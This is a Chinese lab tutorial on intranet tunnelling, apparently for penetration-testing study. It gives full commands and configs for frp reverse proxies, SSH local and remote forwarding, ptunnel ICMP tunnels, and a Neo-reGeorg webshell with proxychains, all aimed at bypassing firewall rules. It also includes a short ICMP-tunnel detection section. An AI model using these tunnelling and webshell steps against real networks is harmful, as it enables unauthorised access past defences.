Frp反向代理内网穿透

说明：

frp说明&下载

https://github.com/fatedier/frp


实验拓扑：

实验说明：

C的3389端口开放，B与C之间有防火墙过滤，防火墙策略不允许外部ip访问服务器的3389端口。现在要做的是把C的3389端口映射到公网B的6666端口上，那么A访问公网的6666端口就能访问C的3389端口。因为这种方式是从C内部发起请求的，所以能够穿透防火墙不被外到内的策略拦截。

步骤：

服务端

1、配置文件frps.ini修改

[common]bind_port = 7000   //客户端连接端口token = 123123    //连接密码

2、配置服务开机自启动

vi /usr/lib/systemd/system/frps.service

[Unit]Description=frps serviceAfter=network.target
[Service]Type=simpleExecStart=/home/kali/Desktop/frp_0.44.0_linux_amd64/frps -c /home/kali/Desktop/frp_0.44.0_linux_amd64/frps.ini
[Install]WantedBy=multi-user.target

3、开启frps服务

systemctl enable frpssystemctl start frpssystemctl status frps

客户端

1、配置文件frpc.ini修改

[common]server_addr = 192.168.11.129 //服务端ipserver_port = 7000      //服务端端口token = 123123        //连接密码
[test]type = tcplocal_ip = 127.0.0.1     //访问iplocal_port = 3389       //本地端口remote_port = 6666      //远程开启服务端端口

2、开启frpc服务

frp.exe       //启动服务

整个流程就是C与B建立通信后，当A访问B的6666端口，B收到请求对流量进行转发，那么A就能访问到C的3389端口。

SS隧道转发

说明：

因为 SSH 协议在传输过程中都是加密，所以在流量层面也较难区分合法的 SSH 流量和攻击者产生的 SSH 流量。因此在内网渗透过程中，使用 SSH 协议进行建立隧道的方法，一方面不用自己再上传同类工具，另一方面降低了因上传使用了同类工具被管理员发现的风险。与此同时，如果工作环境中的防火墙限制了一些网络端口的使用，但是允许SSH 的连接，也能够通过将TCP 端口转发来使用 SSH 进行通讯。

本地转发：

正向连接

命令

ssh -L localport:remotehost:remotehostport sshserver


解释:

localport     本机开启的端口号

remotehost    最终连接机器的IP

remotehostport 地址转发机器的端口号

sshserver     转发机器的IP 地址

选项：

-f 后台启用

-N 不打开远程shell，处于等待状态（不加-N 则直接登录进去）

-g 启用网关功能

实验拓扑：

实验说明：

C服务器上开启了mysql服务，只允许本地访问，外部不能访问，避免了数据库遭受外部攻击。在B主机上将C的3306端口映射到本地3307端口，接下来就可以通过连接本地的 3307 端口就可以连接到C的 3306 端口了，同时绕过mysql只允许本地访问的限制。

步骤：

1、确认C服务器上mysql服务只允许本地连接

2、此时无法B无法连接C的mysql服务


3、在B上配置

ssh -L 3307:localhost:3306 aaa@192.168.11.128 -fNmysql -h 127.0.0.1 -P 3307 -u root

4、B成功连接C的mysql服务

远程转发

命令

ssh -R sshserverport:remotehost:remotehostport sshserver

解释：

sshserverport    被转发机器开启的端口号

remotehost     最终连接机器的IP地址

remotehostport   被转发机器的端口号

sshserver       被转发机器的IP地址

实验拓扑：

实验说明：

C服务器上开启了web8080服务，防火墙设置只能B主机访问。在B主机上将C的3306端口映射到本地3307端口，接下来就可以通过连接本地的3307端口就可以连接到C的3306端口了，同时绕过mysql只允许本地访问的限制。

步骤：

1、注意的是需要先修改/etc/ssh/sshd_config，添加字段如下，有则将no改为yes，如果不添加/修改该字段，会出现完成远程转发后访问端口只会是127.0.0.1而不是0.0.0.0任意B主机上的IP。

GatewayPorts yes

2、80端口未修改只允许127.0.0.1访问

3、修改后80端口可以通过B上所有的ip访问0.0.0.0

4、在C主机上执行命令

ssh -R 80:192.168.11.128:8080 kali@192.168.11.129

5、在A主机上成功访问

区别：

本地转发是正向代理连接的过程，远程转发是反向代理的过程。

ICMP隧道封装

说明：

在一些网络环境中，如果不经过认证，TCP和UDP数据包都会被拦截。如果用户可以 ping 通远程计算机，就可以尝试建立 ICMP 隧道，将 TCP 数据通过该隧道发送，实现不受限的网络访问。用户需要在受限制网络之外，预先启动该工具建立代理服务器。再以客户端模式运行该工具，就可以建立 ICMP 隧道。为了避免该隧道被滥用，用户还可以为隧道设置使用密码。

一、icmptunnel可以将 IP 流量封装进 IMCP 的ping 数据包中，旨在利用 ping穿透防火墙的检测，因为通常防火墙是不会屏蔽 ping 数据包的。

二、请求端的 Ping 工具会在 ICMP 数据包后面附加上一段随机的数据作为Payload，而响应端则会拷贝这段Payload 到 ICMP 响应数据包中返还给请求端，用于识别和匹配 Ping 请求。

三、在使用 ptunnel 进行内网穿透时，客户端会将 IP 帧封装在 ICMP 请求数据包中发送给服务器，而服务器端则会使用相匹配的 ICMP 响应数据包进行回复。这样在旁人看来，网络中传播的仅仅只是正常的 ICMP 数据包。

命令：

代理服务器：

ptunnel -x 123 //设置密码

攻击机：

ptunnel -p 192.168.139.128 -lp 8080 -da 192.168.139.131 -dp 8080 -x 123


-p  跳板主机地址

-lp 攻击主机本地端口

-da 目的主机地址

-dp 目的主机端口

-x  密码

实验拓扑：

实验说明：

A与B 能互通， B 与C能互通，C防火墙禁止A用TCP协议访问8080端口，但是 A能ping通C由此判断防火墙没有对icmp协议进行封禁，所以可以用 imcp 隧道技术。

步骤：

1、在C主机上配置好防火墙规则，允许A、BpingC，不允许A访问8080端口

2、在B上执行命令

ptunnel -x 123


3、然后在A上执行命令

ptunnel -p 192.168.139.128 -lp 8080 -da 192.168.139.131 -dp 8080 -x 123 

4、执行成功，能成功访问

防御方法：

  • 检测同一来源的ICMP数据包的数量，一个正常的ping命令每秒最多发送两个数据包，而是要ICMP隧道的浏览器会在很短的时间内产生上千个ICMP数据包

  • 注意那些Payload大于64bit的ICMP数据包

  • 寻找响应数据包中的Payload与请求数据包中的Payload不一致的ICMP数据包

  • 检查ICMP数据包的协议标签。例如，icmptunnel会在所有的ICMP Payload前面添加“TUNL"标记来标识隧道

实验拓扑：

实验说明：

B服务器上开启了80http服务以及22ssh服务，但是防火墙上拒绝A访问B的ssh服务，所以需要通过在B服务器上传webshell，然后通过http协议建立socks5连接，使A能够访问B的ssh服务。

步骤：

1、利用Neo-reGeorg生成webshell然后上传到 B服务器

python3 neoreg.py generate -k 123 \\设置密码123

2、根据具体类型上传webshell到服务器

3、在A上连接webshell

python3 neoreg.py -k 123 -u http://192.168.11.128/2.php

连接成功

4、修改vi ./proxychains4.conf

socks5 127.0.0.1 1080

5、开启proxychains4服务

proxychains4 -f /etc/proxychains4.conf ssh aaa@192.168.11.128

连接成功


多级代理

实验拓扑：

实验说明：

A能和B互通，B能和C互通，A和C之间不能互通，C服务器上开启了80http服务，只允许通过访问192.168.12.128访问http服务。因此需要通过配置多级代理，使A能够访问到192.168.12.128上的http服务。

步骤：

1、首先在B上配置frps服务当服务端，C上配置frpc服务当客户端，将http://192.168.12.128反向代理给B

C上开启http服务，只允许通过http://192.168.12.128访问

py -m http.server -b 192.168.12.128 80

B上配置frps.ini

[common]
bind_port = 7000
token = 123123

B上开启frps服务

./frps -c frps.ini

C上配置frpc.ini

[common]
server_addr = 192.168.11.135
server_port = 7000
token=123123

[test]												
type = tcp		
local_ip = 192.168.12.128			
local_port = 80					
remote_port = 80

C上开启frp服务

frpc.exe

2、再在A上配置frps服务当服务端，B上配置frpc服务当客户端，将http://192.168.12.128反向代理给A

A上配置frps.ini

[common]
bind_port = 7000
token = 123123

A上开启frps服务

./frps -c frps.ini

B上配置frpc.ini

[common]
server_addr = 192.168.139.128
server_port = 7000
token = 123123

[tcp]
type = tcp
local_ip = 127.0.0.1
local_port = 80
remote_port = 80

B上开启frpc服务

./frpc -c frpc.ini

3、A能成功访问C上的http服务
